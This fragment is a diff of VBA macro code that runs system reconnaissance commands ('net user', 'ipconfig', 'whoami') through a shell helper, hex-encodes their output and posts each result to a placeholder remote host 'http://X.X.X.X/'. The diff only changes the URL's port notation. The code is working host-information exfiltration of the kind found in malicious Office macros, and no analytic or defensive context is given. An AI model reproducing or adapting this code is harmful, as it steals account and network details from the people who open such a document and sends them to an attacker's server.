@@ -46,7 +46,7 @@ For intX = 1 To Len(strText)
             Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
     Next intX
 Debug.Print (Disp)
-hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+hi = httpPostStringFunc("http://X.X.X.X/", Disp)
 
 Disp = ""
 strText = ShellRun("net user")
@@ -54,7 +54,7 @@ For intX = 1 To Len(strText)
             Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
     Next intX
 Debug.Print (Disp)
-hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+hi = httpPostStringFunc("http://X.X.X.X/", Disp)
 
 Disp = ""
 strText = ShellRun("ipconfig")
@@ -62,7 +62,7 @@ For intX = 1 To Len(strText)
             Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
     Next intX
 Debug.Print (Disp)
-hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+hi = httpPostStringFunc("http://X.X.X.X/", Disp)
 
 Disp = ""
 strText = ShellRun("whoami")
@@ -70,7 +70,7 @@ For intX = 1 To Len(strText)
             Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
     Next intX
 Debug.Print (Disp)
-hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+hi = httpPostStringFunc("http://X.X.X.X/", Disp)
 
 
 End Sub
